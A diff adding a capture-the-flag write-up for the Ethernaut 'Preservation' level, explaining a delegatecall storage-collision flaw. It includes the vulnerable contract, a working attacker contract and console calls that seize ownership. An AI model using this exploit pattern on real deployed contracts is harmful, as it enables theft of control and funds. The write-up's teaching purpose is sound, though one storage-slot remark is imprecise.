@@ -19,6 +19,7 @@ If you want to do the same, I recommend that you try to solve the levels on your
 14. [Level 13: Gatekeeper One](#level-13-gatekeeper-one)
 15. [Level 14: Gatekeeper Two](#level-14-gatekeeper-two)
 16. [Level 15: Naught Coin](#level-15-naught-coin)
+17. [Level 16: Preservation](#level-16-preservation)
 
 ## Level 0: Intro <a name="level-0-intro"></a>
 
@@ -1229,3 +1230,92 @@ That was easier :)
 
 Always check the functions of the contract and the contracts you are inheriting from.
 If the coder forgets to protect a function, you can use it to your advantage.
+
+## Level 16: Preservation <a name="level-16-preservation"></a>
+
+Let's have a look at the contract first:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Preservation {
+    // public library contracts
+    address public timeZone1Library;
+    address public timeZone2Library;
+    address public owner;
+    uint256 storedTime;
+    // Sets the function signature for delegatecall
+    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));
+
+    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
+        timeZone1Library = _timeZone1LibraryAddress;
+        timeZone2Library = _timeZone2LibraryAddress;
+        owner = msg.sender;
+    }
+
+    // set the time for timezone 1
+    function setFirstTime(uint256 _timeStamp) public {
+        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
+    }
+
+    // set the time for timezone 2
+    function setSecondTime(uint256 _timeStamp) public {
+        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
+    }
+}
+
+// Simple library contract to set the time
+contract LibraryContract {
+    // stores a timestamp
+    uint256 storedTime;
+
+    function setTime(uint256 _time) public {
+        storedTime = _time;
+    }
+}
+```
+
+We see here, that the `Preservation` contract uses delegatecall to call the `setTime` function of the `LibraryContract` contract. The `LibraryContract` contract has a `storedTime` variable, which is set by the `setTime` function.
+
+`delegatecall` means, that the code of the `LibraryContract` contract is executed in the context of the `Preservation` contract. That means, that the `LibraryContract` has access to the storage and functions of the `Preservation` contract.
+
+What's the problem here? The storage mapping is wrongly defined in the `LibraryContract`. Instead of being located in the
+2nd slot of the storage, it is located at the 0th slot. That means, that the `storedTime` variable of the `LibraryContract` is
+overwriting the `timeZone1Library` variable of the `Preservation` contract.
+
+We can use that to our advantage. We will deploy a contract which is going to implement a `setTime` function, which is going to 
+overwrite the `owner` variable of the `Preservation` contract.
+
+Let's get to it :)
+
+Our contract:
+
+```solidity
+contract AttackDelegateCall {
+    address public timeZone1Library;
+    address public timeZone2Library;
+    address public owner;
+
+    function setTime(uint256 _time) public {
+        owner = address(uint160(_time));
+    }
+}
+```
+
+Deploy the contract and save the address of the contract. In the browser console call
+
+```
+await contract.setSecondTime("0xaddress of your deployed contract")
+// wait to be included
+await contract.setFirstTime(player)
+//wait to be included
+await contract.owner()
+// your are owner :)
+```
+
+and you are done :)
+
+### Learning
+
+Delegatecall is a powerful tool, but it can also be dangerous. Always make sure that the storage of the contract you are calling is correctly defined.
